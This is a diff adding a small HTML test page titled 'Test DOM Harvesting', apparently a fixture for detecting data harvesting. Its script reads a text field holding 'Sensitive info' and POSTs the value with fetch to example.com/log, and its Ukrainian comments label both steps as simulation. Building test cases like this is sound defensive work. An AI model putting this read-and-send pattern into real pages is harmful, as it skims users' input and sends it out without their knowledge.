@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Test DOM Harvesting</title>
+	</head>
+	<body>
+		<h2>Enter text</h2>
+		<input type="text" id="testInput" value="Sensitive info" />
+
+		<script>
+			const input = document.getElementById("testInput");
+
+			// Симуляція зчитування
+			const value = input.value;
+
+			// Симуляція надсилання через fetch
+			fetch("https://example.com/log", {
+				method: "POST",
+				body: JSON.stringify({ data: value }),
+			});
+		</script>
+	</body>
+</html>
